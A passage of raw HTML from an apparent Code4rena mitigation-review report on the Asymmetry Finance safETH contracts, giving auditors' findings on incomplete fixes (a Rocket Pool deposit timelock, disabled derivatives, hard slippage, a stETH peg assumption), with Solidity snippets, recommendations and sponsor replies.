</span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_minOut</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;mint amount less than minOut&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Staked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\">, </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/71#issuecomment-1539064332\">toshiSat (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p><code>approxPrice</code> isn’t used to show the price + we want the updated price after the stake in the event.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/71#issuecomment-1540986397\">adriro (warden) commented</a>:</strong></p>\n<blockquote>\n<p>This is correct. I added this case in the MR for M-01, which originally talked about “division before multiplication” issues: <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/42\">https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/42</a></p>\n</blockquote>\n<hr>\n<h2 id=\"medium-mitigation-of-m-08-mitigation-error\" style=\"position:relative;\"><a href=\"#medium-mitigation-of-m-08-mitigation-error\" aria-label=\"medium mitigation of m 08 mitigation error permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/51\">[Medium] Mitigation of M-08: Mitigation Error</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/51\">adriro</a></em></p>\n<p><strong>Severity: Medium</strong></p>\n<p>Link to Issue: <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685\">https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685</a></p>\n<h3 id=\"comments\" style=\"position:relative;\"><a href=\"#comments\" aria-label=\"comments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Comments</h3>\n<p>First, there is a clear error in the associated description of mitigation: “Use Chainlink to get rETH”. Using Chainlink to obtain the price of Reth has nothing to do with the described issue in M-08.</p>\n<p>The issue in M-08 is about a potential timelock that is applied to Reth transfers or burn. Currently this timelock is zero, but if this is eventually reintroduced it will cause a DoS in the protocol as new deposits in the Reth derivative will block unstaking or weight rebalances.</p>\n<p>The proposed changeset mitigates the issue, as the Reth deposit implementation is changed to acquire Reth only by swapping it using the Uniswap V3 pool.</p>\n<p>However, another related changeset that modifies the <code>deposit()</code> function reintroduces the vulnerability.</p>\n<h3 id=\"technical-details\" style=\"position:relative;\"><a href=\"#technical-details\" aria-label=\"technical details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technical Details</h3>\n<p>The following pull request <code>https://github.com/asymmetryfinance/smart-contracts/pull/228/files</code> is used as a mitigation for M-04. In this changeset, the protocol team removed the Uniswap V3 pool in favor of using RocketSwapRouter.sol.</p>\n<p>As we can see in the implementation of the <code>swapTo()</code> function, the router may eventually end up depositing a portion of the amount via Rocket Pool:</p>\n<p><a href=\"https://etherscan.deth.net/address/0x16D5A408e807db8eF7c578279BEeEe6b228f1c1C#code\">https://etherscan.deth.net/address/0x16D5A408e807db8eF7c578279BEeEe6b228f1c1C#code</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"171\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:  </span><span class=\"mtk11\">depositPoolDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositPool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">toDepositPool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This reintroduces the deposit using the RocketDepositPool contract, which effectively reintroduces the original issue.</p>\n<h3 id=\"recommendation-9\" style=\"position:relative;\"><a href=\"#recommendation-9\" aria-label=\"recommendation 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Unfortunately, there is no easy way to opt-out from using RocketDepositPool in RocketSwapRouter.sol. A hacky way would be to ensure that the protocol mint rate is below the <code>idealTokensOut</code> variable, so that <code>toDepositPool</code> is always zero, and the deposits are bypassed.</p>\n<p>As an alternative, if the intention is to only use Balancer, the <code>balancerSwap()</code> function can be extracted out from RocketSwapRouter.sol and used directly as the implementation of the <code>deposit()</code> function in the Reth derivative.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/51#issuecomment-1539139184\">elmutt (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>Known issue. Thanks.</p>\n</blockquote>\n<hr>\n<h2 id=\"medium-mitigation-of-m-10-mitigation-error\" style=\"position:relative;\"><a href=\"#medium-mitigation-of-m-10-mitigation-error\" aria-label=\"medium mitigation of m 10 mitigation error permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/54\">[Medium] Mitigation of M-10: Mitigation Error</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/54\">adriro</a>, also reviewed by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/38\">d3e4</a></em></p>\n<p><strong>Severity: Medium</strong></p>\n<p>Link to Issue: <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363\">https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363</a></p>\n<h3 id=\"comments-1\" style=\"position:relative;\"><a href=\"#comments-1\" aria-label=\"comments 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Comments</h3>\n<p>Even though the protocol team applied the warden’s recommendation in M-10, the feature to enable/disable derivatives added as a mitigation for H-03/M-02/M-05 potentially reintroduces the issue.</p>\n<h3 id=\"technical-details-1\" style=\"position:relative;\"><a href=\"#technical-details-1\" aria-label=\"technical details 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technical details</h3>\n<p>The following pull request <code>https://github.com/asymmetryfinance/smart-contracts/pull/264/files</code> adds a feature to enable or disable derivatives. As a result of this change, it is now possible to have at least one derivative, such that <code>derivativeCount > 0</code>, but have that derivative disabled.</p>\n<p>Given this scenario, the added check in <code>https://github.com/asymmetryfinance/smart-contracts/pull/208/files#diff-badfabc2bc0d1b9ef5dbef737cd03dc2f570f6fd2074aea9514da9db2fff6e4eR67</code> will succeed, while the deposit in the for-loop will be skipped as the derivative is disabled here <code>https://github.com/asymmetryfinance/smart-contracts/pull/264/files#diff-badfabc2bc0d1b9ef5dbef737cd03dc2f570f6fd2074aea9514da9db2fff6e4eR86</code>.</p>\n<p>This effectively reintroduces the conditions for the original issue described in M-10.</p>\n<h3 id=\"recommendation-10\" style=\"position:relative;\"><a href=\"#recommendation-10\" aria-label=\"recommendation 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>The check should only consider enabled derivatives. Alternatively the check could be done using the <code>totalWeight</code> variable, as this variable considers only enabled derivatives, and will be zero if all derivatives are disabled.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/54#issuecomment-1539131790\">elmutt (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>We consider this edge case acceptable in order to keep code changes to a minimum.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/54#issuecomment-1540943797\">d3e4 (warden) commented</a>:</strong></p>\n<blockquote>\n<p>The suggested check using <code>totalWeight</code> has indeed been implemented. See <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/38\"><code>#38</code></a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/54#issuecomment-1542926827\">adriro (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p><em>The suggested check using <code>totalWeight</code> has indeed been implemented. See <code>#38</code>.</em></p>\n</blockquote>\n<p>I think that change should be out of scope as it is not part of the pull requests in scope. Need to double check though.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/54#issuecomment-1542928386\">adriro (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Yes, that change is part of the following commit <code>https://github.com/asymmetryfinance/smart-contracts/commit/75c4a6f5abe2ee6ae434fba6dc24845588b6ca02</code>, which isn’t part of PR <code>#208</code> or <code>#264</code>.</p>\n</blockquote>\n<hr>\n<h2 id=\"medium-hard-slippage-in-rethwithdraw\" style=\"position:relative;\"><a href=\"#medium-hard-slippage-in-rethwithdraw\" aria-label=\"medium hard slippage in rethwithdraw permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/67\">[Medium] Hard slippage in <code>Reth.withdraw()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/67\">d3e4</a>, also reviewed by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/57\">adriro</a></em></p>\n<p><strong>Severity: Medium</strong></p>\n<p><code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/derivatives/Reth.sol#L121</code></p>\n<h3 id=\"description-2\" style=\"position:relative;\"><a href=\"#description-2\" aria-label=\"description 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>A hard slippage has been introduced in <code>Reth.withdraw()</code> (<code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/derivatives/Reth.sol#L121</code>). This is a new occurrence of part of M-12 (not the main report, but e.g. <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/699\">this duplicate</a>), namely that the slippage can be changed only by the owner, which under volatile market conditions or a depegging may be violated and thus DoS unstaking.</p>\n<p>Note that the aspect of this issue that a user may lose funds because of an undesirable slippage which he cannot change has been fixed by the mitigation of M-12. The aspect detailed here, however, has not been fixed, and this is a new occurrence of the same type.</p>\n<h3 id=\"recommendation-11\" style=\"position:relative;\"><a href=\"#recommendation-11\" aria-label=\"recommendation 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Remove all slippage control from the derivatives and control slippage only in <code>SafEth.unstake()</code> and <code>SafEth.unstake()</code> with the new <code>_minOut</code> which was put in place in the (unsuccessful) mitigation of M-12. Note that this is the same fix as for what remains to fix in M-12.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/57#issuecomment-1539112953\">elmutt (Asymmetry) commented via duplicate issue <code>#57</code></a>:</strong></p>\n<blockquote>\n<p>Your issue makes sense but we are ok with having slippage in the derivatives as well as the main contract.</p>\n</blockquote>\n<hr>\n<h2 id=\"mitigation-of-h-06-issue-not-mitigated\" style=\"position:relative;\"><a href=\"#mitigation-of-h-06-issue-not-mitigated\" aria-label=\"mitigation of h 06 issue not mitigated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/40\">Mitigation of H-06: Issue not mitigated</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/40\">adriro</a>, also reviewed by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/13\">0x52</a></em></p>\n<p>Link to Issue: <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588\">https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588</a></p>\n<h3 id=\"comments-2\" style=\"position:relative;\"><a href=\"#comments-2\" aria-label=\"comments 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Comments</h3>\n<p>Issue H-06 describes the potential problems of assuming a peg of stETH to ETH. The sponsor proposed a mitigation to fetch the price of stETH using a Chainlink price feed. </p>\n<p>While the main idea of using Chainlink as the price oracle instead of assuming a 1:1 peg is ok, there is an error in the mitigation as the change misses a critical place where the peg is still assumed. This error is described below.</p>\n<p>There is also new issue introduced with the usage of Chainlink, which is described in a separate report (<a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/60\">issue 60</a>).</p>\n<h3 id=\"technical-details-2\" style=\"position:relative;\"><a href=\"#technical-details-2\" aria-label=\"technical details 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technical Details</h3>\n<p>The proposed pull request changes the implementation of the <code>ethPerDerivative()</code> function to fetch the stETH price using Chainlink. However, as we can see in the following snippet, the <code>withdraw()</code> function is still assuming a peg of stETH to ETH:</p>\n<p><code>https://github.com/asymmetryfinance/smart-contracts/pull/242/files#diff-ac281bf63004ef9a825c084018c54f10b03233cd4f286398f5d5e993612308b5R60-R71</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"172\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unwrap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STETH_TOKEN</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STETH_TOKEN</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LIDO_CRV_POOL</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IStEthEthPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LIDO_CRV_POOL</span><span class=\"mtk1\">).</span><span class=\"mtk11\">exchange</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 